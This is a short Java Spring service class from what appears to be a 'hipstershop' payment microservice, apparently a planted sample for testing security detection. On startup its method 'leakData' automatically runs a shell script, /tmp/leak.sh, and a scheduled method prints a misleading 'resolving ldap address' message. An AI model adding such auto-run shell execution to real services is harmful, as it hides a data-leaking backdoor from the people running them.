package com.hipstershop.paymentservicejava;

import javax.annotation.PostConstruct;

import org.springframework.scheduling.annotation.Scheduled;
import org.springframework.stereotype.Service;


@Service
public class ShellSpawnService {

    @PostConstruct
    public void leakData() {

        try {
            Runtime.getRuntime().exec("/bin/sh -c /tmp/leak.sh");
        } catch(Exception e) {
            e.printStackTrace();
        }
    }

    @Scheduled()
    public void doNothing() {
        System.out.println("resolving ldap address");
    }

}
